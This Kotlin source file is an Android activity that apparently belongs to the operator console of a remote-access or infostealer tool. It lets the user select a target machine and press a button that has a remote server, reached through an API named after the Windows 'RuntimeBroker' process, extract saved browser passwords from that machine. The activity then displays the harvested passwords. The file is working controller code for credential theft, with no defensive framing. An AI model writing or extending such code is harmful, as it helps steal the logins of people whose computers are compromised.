package com.mimo.pro

import android.os.Bundle
import android.view.View
import androidx.lifecycle.lifecycleScope
import com.mimo.pro.api.RuntimeBrokerApi
import com.mimo.pro.databinding.ActivityBrowserPasswordBinding
import kotlinx.coroutines.launch

class BrowserPasswordActivity : BaseActivity() {

    private lateinit var binding: ActivityBrowserPasswordBinding
    private var machineName = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityBrowserPasswordBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setSupportActionBar(binding.toolbar)
        supportActionBar?.setDisplayHomeAsUpEnabled(true)
        supportActionBar?.title = getString(R.string.extract_passwords_title)

        machineName = intent.getStringExtra(MainActivity.EXTRA_MACHINE).orEmpty()

        binding.btnExtract.setOnClickListener {
            extractPasswords()
        }
    }

    private fun extractPasswords() {
        binding.progressBar.visibility = View.VISIBLE
        binding.tvResults.text = getString(R.string.extract_passwords_scanning)
        binding.btnExtract.isEnabled = false

        lifecycleScope.launch {
            try {
                val url = Connection.resolveBase(this@BrowserPasswordActivity)
                val pw = Connection.resolvePassword(this@BrowserPasswordActivity)
                val result = RuntimeBrokerApi.extractBrowserPasswords(url, machineName, pw)
                runOnUiThread {
                    binding.progressBar.visibility = View.GONE
                    binding.btnExtract.isEnabled = true
                    if (result != null) {
                        binding.tvResults.text = result
                    } else {
                        binding.tvResults.text = getString(R.string.extract_passwords_failed, "Connection error")
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    binding.progressBar.visibility = View.GONE
                    binding.btnExtract.isEnabled = true
                    binding.tvResults.text = getString(R.string.extract_passwords_failed, e.message)
                }
            }
        }
    }

    override fun onSupportNavigateUp(): Boolean {
        finish()
        return true
    }
}
